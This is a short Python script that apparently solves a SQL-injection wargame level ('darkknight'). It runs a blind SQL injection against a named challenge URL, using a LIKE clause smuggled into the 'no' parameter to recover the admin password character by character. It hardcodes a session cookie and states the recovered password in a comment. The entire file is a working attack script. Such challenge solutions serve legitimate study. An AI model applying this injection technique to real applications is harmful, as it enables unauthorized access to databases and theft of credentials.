import requests

# Point!!!!  select id from abcd where id='guest' and pw='1' and no=0 or no like 2 and "1%";
# Admin Password 0b70ea1f

pw = ""
url = "http://los.rubiya.kr/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"

headers = {
    "Cookie": "PHPSESSID=vaiqsfrlsquaoq5sr1pdt5a1u2"
}

for i in range(1,9):
    for j in range(0x20,0x7f):
        if chr(j) == '%' or chr(j) == '#' or chr(j) == "\'" or chr(j) == '\"' or chr(j) == '!': continue

        pw_length_test = pw+chr(j)+"%"
        print "[Try index:%d, %s]" % (i,pw_length_test)

        params = {
            "pw":1,
            "no":'0 or no like 2 and pw like \"%s\"' % pw_length_test
        }

        try:
            res = requests.get(url, params=params, headers=headers)
            if "Hello admin" in res.content:
                print "Found It!: %c" % chr(j)
                pw = pw+chr(j)
                break

        except Exception as e:
            j=j-1
            continue

print "password:",pw.lower()